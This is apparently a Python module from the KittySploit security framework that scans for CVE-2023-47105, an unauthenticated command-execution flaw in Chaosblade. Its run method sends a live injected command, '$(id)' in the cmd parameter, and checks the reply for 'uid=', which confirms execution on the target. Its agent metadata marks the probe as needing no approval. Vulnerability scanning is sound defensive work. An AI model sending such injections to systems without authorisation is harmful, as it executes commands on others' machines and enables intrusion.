#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""exec."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chaosblade < 1.7.4 - Remote Code Execution Detection',
        'description': 'exec.CommandContext in Chaosblade 0.3 through 1.7.3, when server mode is used, allows OS command execution via the cmd parameter without authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'chaosblade', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-47105',
            'https://github.com/advisories/GHSA-723h-x37g-f8qm',
            'https://github.com/chaosblade-io/chaosblade/blob/0a07380c9899febb2b544132783b376b44226cca/exec/os/executor.go#L68',
            'https://narrow-oatmeal-0c0.notion.site/ChaosBlade-Remote-Command-Execution-CVE-2023-47105-4f5459046488436caaec2bced6ff26d7',
        ],
        'cve': 'CVE-2023-47105',
    }

    def run(self):
        path = '/chaosblade?cmd=$(id)'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('uid=', 'code', 'success\\')
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Chaosblade < 1.7.4 - Remote Code Execution detected', path=path)
            return True
        return False

